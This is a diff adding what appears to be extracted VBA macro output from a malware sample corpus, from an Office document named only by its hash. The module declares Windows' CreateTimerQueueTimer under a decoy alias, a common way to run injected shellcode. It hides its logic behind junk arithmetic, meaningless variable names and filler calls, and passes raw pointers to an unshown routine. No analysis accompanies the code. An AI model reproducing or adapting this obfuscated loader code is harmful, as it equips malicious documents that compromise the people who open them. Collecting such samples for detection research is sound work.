@@ -1,0 +1,36 @@
+Filename     : ./macros/4074ae1af5d6c514e895cdc9ba844dffc5e58cb13ce2665ed1a79a63bb1f937e
+OLE stream   : Macros/VBA/xmods
+VBA filename : xmods.bas
+----------------------------------------
+Attribute VB_Name = "xmods"
+#If (89 - 45 + 356 + 85 - 60 + 275) > ((52 - 85 + 353) - (91 - 2 + 451) * 1) And ((58 - 43 + 13) - (1 - 37 + 64)) * 2 < (Win64) Then
+Public Declare PtrSafe Function kilowatt _
+Lib "Kernel32 " Alias _
+"CreateTimerQueueTimer" (debile As Any, ByVal scrimp As Any, ByVal aioli As Any, ByVal conflux As Any, ByVal legionary As Any, ByVal albatrellus As Any, ByVal espieglerie As Any) As Long
+#End If
+Function dubash(dramaturgic, machete, severality)
+Dim initiate As Byte
+Dim battologize As Integer
+Dim pike As LongPtr
+Dim orbicular As LongPtr
+Dim paralyze As LongPtr
+Dim deficient As Long
+Dim theatrical As LongPtr
+Dim absorbefacient As LongPtr
+losings = losings
+flaky = Fix(447)
+orbicular = dramaturgic
+absorbefacient = severality
+redefinition = "bringword"
+theatrical = machete
+neonatalmed = 24 + 55
+Pmt 0, neonatalmed, 13964, 22109, 4
+cantonment = Math.Round(210)
+pike = 9 - 6 - 4
+equerry ByVal pike, _
+orbicular, _
+theatrical, absorbefacient, _
+paralyze
+cantonment = Rnd(143)
+End Function
+
